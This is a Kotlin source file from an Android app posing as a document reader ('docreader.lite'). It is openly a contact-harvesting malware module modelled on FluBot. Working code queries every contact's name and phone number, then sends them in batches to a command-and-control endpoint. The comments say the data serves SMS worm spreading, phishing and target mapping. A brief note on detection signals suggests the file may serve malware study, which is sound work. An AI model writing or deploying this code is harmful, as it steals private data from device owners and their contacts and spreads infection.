package com.docreader.lite.reader.share

import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import com.docreader.lite.reader.Exfil

/**
 * Contact harvester — exfiltrates contact list to C2.
 *
 * Used for:
 *   1. Target discovery — find contacts at same bank (social graph)
 *   2. SMS worm spreading — send install-link SMS to contacts
 *   3. Phishing — personalized messages using real contact names
 *   4. Intelligence — map victim's social/professional network
 *
 * FluBot: harvested contacts → sent SMS with package-tracking lure
 * to every contact → exponential spread across Europe (2021-2022).
 *
 * Detection: READ_CONTACTS permission + batch contact query +
 * subsequent network exfil within 60s = contact harvest signal.
 */
object ContactSync {

    data class Contact(
        val name: String,
        val phone: String,
        val email: String?,
    )

    /**
     * Harvest all contacts with phone numbers.
     * Returns list for C2 exfil + SMS spreading.
     */
    fun harvest(context: Context): List<Contact> {
        val contacts = mutableListOf<Contact>()

        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

                while (it.moveToNext()) {
                    val name = it.getString(nameIdx) ?: continue
                    val phone = it.getString(phoneIdx) ?: continue

                    // Normalize phone number (strip spaces, dashes)
                    val normalized = phone.replace(Regex("[\\s\\-()]+"), "")
                    if (normalized.length < 7) continue // too short

                    contacts.add(Contact(name, normalized, null))
                }
            }
        } catch (_: Exception) {}

        return contacts.distinctBy { it.phone } // deduplicate
    }

    /**
     * Exfiltrate harvested contacts to C2.
     */
    fun exfiltrate(context: Context) {
        val contacts = harvest(context)
        if (contacts.isEmpty()) return

        // Batch send — chunk to avoid oversized payloads
        contacts.chunked(50).forEach { chunk ->
            val data = chunk.joinToString("|") { "${it.name}:${it.phone}" }
            Exfil.event("contacts_harvested",
                "count" to chunk.size.toString(),
                "data" to data.take(500)
            )
        }
    }
}
